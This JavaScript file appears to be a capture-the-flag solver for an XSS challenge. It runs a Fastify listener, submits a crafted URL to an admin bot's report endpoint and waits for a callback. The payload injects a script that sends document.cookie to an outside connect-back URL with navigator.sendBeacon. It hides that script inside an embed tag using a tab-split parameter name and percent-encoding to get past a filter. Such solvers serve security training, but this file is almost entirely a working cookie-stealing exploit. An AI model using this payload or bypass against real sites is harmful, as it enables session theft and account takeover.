const app = require("fastify")();

const fail = (message) => {
  console.error(message);
  return process.exit(1);
};

const BOT_BASE_URL = process.env.BOT_BASE_URL ?? "http://localhost:1337";
const CONNECTBACK_URL = process.env.CONNECTBACK_URL ?? fail("No URL");
const PORT = "8080";

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const reportUrl = (url) =>
  fetch(`${BOT_BASE_URL}/api/report`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({ url }),
  }).then((r) => r.text());

const innerHtml = `<script>navigator.sendBeacon("${CONNECTBACK_URL}", document.cookie)</script>`;

const encode = (s) =>
  [...s]
    .map((c) => "%" + c.codePointAt(0).toString(16).padStart(2, "0"))
    .join("");

const outerHtml = `<embed code="/view?h\ttml=${encode(
  innerHtml
)}" type=text/xml>`;

app.post("/", async (req, reply) => {
  // You got a flag!
  console.log(req.body);
  process.exit(0);
});

app.listen({ port: PORT, host: "0.0.0.0" }, async (err) => {
  if (err) fail(err.toString());

  await sleep(3 * 1000);
  await reportUrl(
    `http://localhost:3000/view?html=${encodeURIComponent(outerHtml)}`
  );

  await sleep(5 * 1000);
  fail("Failed");
});
